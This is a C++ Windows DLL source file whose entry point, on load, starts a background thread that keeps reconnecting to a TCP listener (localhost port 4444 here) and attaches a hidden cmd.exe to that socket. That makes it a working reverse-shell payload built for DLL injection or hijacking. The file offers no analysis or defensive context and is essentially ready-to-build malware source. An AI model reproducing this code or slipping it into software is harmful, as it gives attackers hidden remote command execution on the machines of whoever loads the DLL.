// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <iostream>
#include <winsock2.h>
#include "windows.h"
#include <mstcpip.h>
#pragma comment(lib, "ws2_32")
#pragma warning(disable:4996)
using namespace std;
void connectserver()
{
	unsigned short  Port = 4444;
	WSADATA         wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKADDR_IN     ServerAddr;
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(Port);
	while (true)
	{
		SOCKET	s;
		while (true)
		{
			struct hostent* hptr;
			while ((hptr = gethostbyname("localhost")) == NULL);
			ServerAddr.sin_addr.S_un.S_addr = *((ULONG*)(hptr->h_addr));
			while ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)) == 0);
			int keepAlive = 1; // 开启keepalive属性
			setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char*)&keepAlive, sizeof(keepAlive));
			struct tcp_keepalive in_keep_alive = { 0 };
			unsigned long ul_in_len = sizeof(struct tcp_keepalive);
			struct tcp_keepalive out_keep_alive = { 0 };
			unsigned long ul_out_len = sizeof(struct tcp_keepalive);
			unsigned long ul_bytes_return = 0;
			in_keep_alive.onoff = 1;                    /*打开keepalive*/
			in_keep_alive.keepaliveinterval = 5000; /*发送keepalive心跳时间间隔-单位为毫秒*/
			in_keep_alive.keepalivetime = 1000;         /*多长时间没有报文开始发送keepalive心跳包-单位为毫秒*/
			WSAIoctl(s, SIO_KEEPALIVE_VALS, (LPVOID)&in_keep_alive, ul_in_len,
				(LPVOID)&out_keep_alive, ul_out_len, &ul_bytes_return, NULL, NULL);
			if (connect(s, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) != SOCKET_ERROR)
				break;
			closesocket(s);
		}
		char SystemName[128] = "cmd";
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		GetStartupInfo(&si);
		si.cb = sizeof(STARTUPINFO);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		CreateProcess(NULL, SystemName, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		closesocket(s);
	}
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connectserver, 0, 0, NULL);
    }
    break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
